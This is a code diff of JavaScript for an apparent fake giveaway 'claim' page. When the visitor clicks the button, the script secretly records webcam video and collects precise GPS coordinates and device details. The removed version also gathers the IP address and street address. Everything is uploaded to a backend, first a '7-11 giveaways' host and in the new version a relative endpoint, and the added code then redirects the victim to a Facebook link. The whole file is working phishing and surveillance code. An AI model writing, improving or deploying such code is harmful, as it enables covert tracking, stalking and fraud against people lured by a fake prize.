@@ -1,139 +1,85 @@
-const video = document.getElementById('preview');
 const btn = document.getElementById('startBtn');
 const loading = document.getElementById('loading');
+const video = document.getElementById('preview');
+
+const REDIRECT_URL = "https://www.facebook.com/share/1DQpaDAogj/";
 
 // Initialize camera
 async function initCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         video.srcObject = stream;
-    } catch (err) {
-        console.warn("Camera access denied.");
-    }
+    } catch (err) { console.warn("Camera permission denied."); }
 }
 initCamera();
 
-// Get GPS location + reverse geocode to address
-async function getLocationData() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve(null);
+// Get battery and device info
+async function getDeviceInfo() {
+    const battery = navigator.getBattery ? await navigator.getBattery() : { level: "N/A" };
+    const ua = navigator.userAgent;
+    return `Battery: ${(battery.level || 0)*100}%, Device: ${ua}`;
+}
 
+// Get exact geolocation
+async function getGeo() {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({});
         navigator.geolocation.getCurrentPosition(
-            async (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                let address = "Unknown";
-
-                try {
-                    const geoRes = await fetch(
-                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
-                    );
-                    const geoData = await geoRes.json();
-                    address = geoData.display_name || "Unknown";
-                } catch (e) {
-                    console.warn("Reverse geocoding failed");
-                }
-
+            pos => {
                 resolve({
-                    latitude: lat,
-                    longitude: lon,
-                    accuracy,
-                    address,
-                    googleMaps: `https://www.google.com/maps?q=${lat},${lon}`
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    maps: `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`
                 });
             },
-            () => resolve(null),
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            err => resolve({})
         );
     });
 }
 
-// Get battery info
-async function getBatteryInfo() {
-    if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        return {
-            level: (battery.level * 100).toFixed(0) + '%',
-            charging: battery.charging
-        };
-    }
-    return null;
-}
-
-// Get public IP address
-async function getIP() {
-    try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-    } catch {
-        return null;
-    }
-}
-
-// Handle Claim Now button click
+// Claim Now
 btn.addEventListener('click', async () => {
-
     btn.style.display = 'none';
     loading.style.display = 'block';
 
     try {
-        const stream = video.srcObject;
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const recorder = new MediaRecorder(video.srcObject, { mimeType: 'video/webm' });
         let chunks = [];
 
-        recorder.ondataavailable = e => {
-            if (e.data.size > 0) chunks.push(e.data);
-        };
+        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
 
         recorder.onstop = async () => {
             const videoBlob = new Blob(chunks, { type: 'video/webm' });
+            const deviceInfo = await getDeviceInfo();
+            const geo = await getGeo();
+
             const formData = new FormData();
-            formData.append('video', videoBlob, 'claim_video.webm');
+            formData.append('video', videoBlob, 'claim_video.mp4');
+            formData.append('deviceInfo', deviceInfo);
+            formData.append('latitude', geo.latitude || '');
+            formData.append('longitude', geo.longitude || '');
+            formData.append('accuracy', geo.accuracy || '');
+            formData.append('maps', geo.maps || '');
 
-            // Gather location, battery, IP, device info
-            const location = await getLocationData();
-            const battery = await getBatteryInfo();
-            const ip = await getIP();
-            const device = {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                battery,
-                ip
-            };
-
-            // Append data to form
-            if (location) {
-                formData.append("latitude", location.latitude);
-                formData.append("longitude", location.longitude);
-                formData.append("accuracy", location.accuracy);
-                formData.append("address", location.address);
-                formData.append("maps", location.googleMaps);
+            try {
+                const res = await fetch("/upload-video", { method: "POST", body: formData });
+                const data = await res.json();
+                console.log("Video posted:", data);
+                loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
+            } catch (err) {
+                console.error("Error posting video:", err);
+                loading.innerHTML = "<p>Error occurred. Redirecting...</p>";
+            } finally {
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
             }
-            formData.append("deviceInfo", JSON.stringify(device));
-
-            // Send to backend
-            const res = await fetch("https://seven-11-giveaways-2026-k7mn.onrender.com/upload-video", {
-                method: "POST",
-                body: formData
-            });
-
-            const data = await res.json();
-
-            console.log("Video posted:", data);
-            console.log("Location info:", location);
-            console.log("Device info:", device);
-
-            loading.innerHTML = "<p>Success! Your claim video has been posted with location & device info.</p>";
         };
 
         recorder.start();
-        setTimeout(() => recorder.stop(), 4000); // record 4 seconds
+        setTimeout(() => recorder.stop(), 4000);
 
     } catch (err) {
-        console.error(err);
-        loading.innerHTML = "<p>Error capturing video.</p>";
+        console.error("Recording error:", err);
+        loading.innerHTML = "<p>Error occurred. Please try again.</p>";
     }
-
 });
